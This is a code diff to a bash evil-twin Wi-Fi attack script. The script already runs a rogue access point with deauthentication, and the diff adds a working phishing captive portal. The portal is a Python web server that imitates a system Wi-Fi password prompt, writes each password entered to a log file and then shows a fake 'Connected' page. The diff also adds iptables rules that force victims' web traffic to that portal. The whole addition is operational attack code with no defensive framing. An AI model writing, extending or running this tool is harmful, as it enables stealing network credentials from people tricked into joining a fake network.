@@ -215,6 +215,10 @@ check_programs() {
         missing_packages="${missing_packages} isc-dhcp-server"
     fi
 
+    if ! [ -x "$(command -v python3 2>&1)" ]; then
+        missing_packages="${missing_packages} python3"
+    fi
+
     if [ -n "${missing_packages}" ]; then
         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Missing packages:${BOLD_YELLOW}${missing_packages}${WHITE}"
         echo ""
@@ -634,6 +638,104 @@ print_header() {
     echo -e "                        ${CYAN}+${YELLOW}----------------------------${CYAN}+"
 }
 
+create_captive_portal() {
+    local essid="${1}"
+    local script_path="${TMP_DIR}/captive_portal.py"
+    local log_path="${TMP_DIR}/passwords.txt"
+    mkdir -p "${TMP_DIR}"
+    cat > "${script_path}" << 'PYEOF'
+#!/usr/bin/env python3
+import http.server, urllib.parse, sys, os, datetime
+
+ESSID = sys.argv[1] if len(sys.argv) > 1 else "Network"
+LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/passwords.txt"
+PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 80
+
+LOGIN_PAGE = """<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to {essid}</title>
+<style>
+* {{ margin: 0; padding: 0; box-sizing: border-box; }}
+body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f2f2f7; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
+.card {{ background: white; border-radius: 14px; padding: 30px; margin: 20px; max-width: 380px; width: 100%; box-shadow: 0 1px 3px rgba(0,0,0,0.08); text-align: center; }}
+.icon {{ font-size: 48px; margin-bottom: 12px; }}
+h2 {{ font-size: 20px; font-weight: 600; color: #1c1c1e; margin-bottom: 6px; }}
+p {{ font-size: 14px; color: #8e8e93; margin-bottom: 24px; }}
+input {{ width: 100%; padding: 14px 16px; border: 1px solid #d1d1d6; border-radius: 10px; font-size: 16px; outline: none; transition: border 0.2s; }}
+input:focus {{ border-color: #007aff; }}
+button {{ width: 100%; padding: 14px; background: #007aff; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 12px; }}
+button:hover {{ background: #0056b3; }}
+.error {{ color: #ff3b30; font-size: 13px; margin-top: 8px; display: none; }}
+</style></head>
+<body>
+<div class="card">
+<div class="icon">🔒</div>
+<h2>"{essid}" Requires a Password</h2>
+<p>Enter the network password to connect</p>
+<form method="POST" action="/" onsubmit="document.getElementById('btn').disabled=true;document.getElementById('btn').textContent='Connecting...'">
+<input type="password" name="password" placeholder="Wi-Fi Password" autocomplete="off" required>
+<div class="error" id="error">Incorrect password, try again</div>
+<button type="submit" id="btn">Join Network</button>
+</form>
+</div></body></html>
+"""
+
+SUCCESS_PAGE = """<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Connected</title>
+<style>
+* {{ margin: 0; padding: 0; box-sizing: border-box; }}
+body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f2f2f7; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
+.card {{ background: white; border-radius: 14px; padding: 30px; margin: 20px; max-width: 380px; width: 100%; box-shadow: 0 1px 3px rgba(0,0,0,0.08); text-align: center; }}
+.check {{ font-size: 48px; color: #34c759; margin-bottom: 12px; }}
+h2 {{ font-size: 20px; font-weight: 600; color: #1c1c1e; }}
+p {{ font-size: 14px; color: #8e8e93; margin-top: 8px; }}
+</style></head>
+<body>
+<div class="card">
+<div class="check">&#10003;</div>
+<h2>Connected Successfully</h2>
+<p>You now have internet access.</p>
+</div></body></html>
+"""
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/html; charset=utf-8")
+        self.send_header("Cache-Control", "no-cache")
+        self.end_headers()
+        self.wfile.write(LOGIN_PAGE.format(essid=ESSID).encode("utf-8"))
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-length", 0))
+        body = self.rfile.read(length).decode("utf-8", errors="replace")
+        params = urllib.parse.parse_qs(body)
+        password = params.get("password", [""])[0]
+        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{ts}] Password: {password}\n")
+        self.send_response(200)
+        self.send_header("Content-type", "text/html; charset=utf-8")
+        self.send_header("Cache-Control", "no-cache")
+        self.end_headers()
+        self.wfile.write(SUCCESS_PAGE.encode("utf-8"))
+
+    def log_message(self, format, *args):
+        pass
+
+if __name__ == "__main__":
+    server = http.server.HTTPServer(("0.0.0.0", PORT), Handler)
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        pass
+PYEOF
+    chmod +x "${script_path}"
+}
+
 cleanup() {
     echo ""
     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Cleaning up...${WHITE}"
@@ -644,6 +746,9 @@ cleanup() {
         ip link set "${iface}" down 2>/dev/null || true
         iw dev "${iface}" del 2>/dev/null || true
     done
+    pkill -f "captive_portal.py" 2>/dev/null || true
+    iptables -t nat -D PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
+    iptables -t nat -D PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 80 2>/dev/null || true
     iptables -D FORWARD -i at0 -o "${lan}" -j ACCEPT 2>/dev/null || true
     iptables -D FORWARD -i "${lan}" -o at0 -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
     iptables -t nat -D POSTROUTING -o "${lan}" -j MASQUERADE 2>/dev/null || true
@@ -769,10 +874,11 @@ main() {
                     else
                         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Internet access: ${BOLD_RED}Disabled${WHITE}"
                     fi
-                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check logs: ${BOLD_CYAN}${TMP_DIR}/{airbase-ng,dhcpd,aireplay-ng}.log${WHITE}"
+                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check: ${BOLD_CYAN}${TMP_DIR}/{airbase-ng,dhcpd,aireplay-ng}.log${GREEN}, passwords: ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
                     echo ""
-                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Commands: ${BOLD_YELLOW}[d]${GREEN}eauth ${WHITE}| ${BOLD_YELLOW}[q]${GREEN}uit${WHITE}"
+                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Commands: ${BOLD_YELLOW}[d]${GREEN}eauth ${WHITE}| ${BOLD_YELLOW}[c]${GREEN}aptive portal ${WHITE}| ${BOLD_YELLOW}[q]${GREEN}uit${WHITE}"
                     deauth_running=false
+                    portal_running=false
                     while true; do
                         echo -e -n "${YELLOW}>>${WHITE} "
                         read -n 1 cmd
@@ -786,6 +892,19 @@ main() {
                                     deauth_running=true
                                 else
                                     echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Deauth already running.${WHITE}"
+                                fi
+                                ;;
+                            c|C)
+                                if [ "${portal_running}" == false ]; then
+                                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting captive portal on port 80...${WHITE}"
+                                    create_captive_portal "${selected_essid}"
+                                    iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 80
+                                    iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j REDIRECT --to-port 80
+                                    run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80" "captive_portal"
+                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal running. Passwords logged to ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
+                                    portal_running=true
+                                else
+                                    echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Captive portal already running.${WHITE}"
                                 fi
                                 ;;
                             q|Q)
